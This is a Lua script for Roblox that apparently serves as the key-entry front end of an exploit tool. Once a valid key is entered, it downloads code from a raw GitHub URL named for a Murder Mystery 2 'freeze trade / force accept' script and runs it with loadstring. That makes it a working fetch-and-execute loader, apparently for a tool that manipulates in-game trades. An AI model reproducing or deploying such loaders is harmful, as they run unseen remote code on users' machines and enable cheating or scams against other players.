-- Functions
function ShowLoading(show)
    LoadingFrame.Visible = show
    MainFrame.Visible = not show
    if show then
        game:GetService("TweenService"):Create(Spinner, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), {Rotation = 360}):Play()
    end
end

function SetStatus(text, color)
    Status.Text = text
    if color then Status.TextColor3 = color end
end

function ValidateKey(inputKey)
    if inputKey == nil or inputKey == "" then
        SetStatus("Please enter a key!", Library.Colors.Accent)
        return false
    end
    
    -- Check if the entered key matches the valid key
    if inputKey == ValidKey then
        return true
    else
        return false
    end
end

function LoadMainScript()
    ShowLoading(true)
    
    local success, scriptData = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/ArisuYT/Mm2FreezeTrade/refs/heads/main/ForceAccept")
    end)
    
    ShowLoading(false)
    
    if success then
        local func, err = loadstring(scriptData)
        if func then
            func()
            return true
        else
            warn("Failed to load script: " .. err)
            return false
        end
    else
        warn("Failed to fetch script")
        return false
    end
end

function ClearKeySystem()
    ScreenGui:Destroy()
end

-- Submit Logic
SubmitBtn.MouseButton1Click:Connect(function()
    local key = KeyBox.Text
    if ValidateKey(key) then
        SetStatus("Key Validated! Loading...", Color3.fromRGB(0, 255, 0))
        task.wait(1)
        
        local loaded = LoadMainScript()
        
        if loaded then
            SetStatus("Success! Starting...", Color3.fromRGB(0, 255, 0))
            task.wait(0.5)
            ClearKeySystem()
        else
            SetStatus("Failed to load script.", Library.Colors.Accent)
        end
    else
        SetStatus("Invalid Key! Try again.", Library.Colors.Accent)
        KeyBox.Text = ""
    end
end)

-- Enter key support
KeyBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        SubmitBtn.MouseButton1Click:Fire()
    end
end)
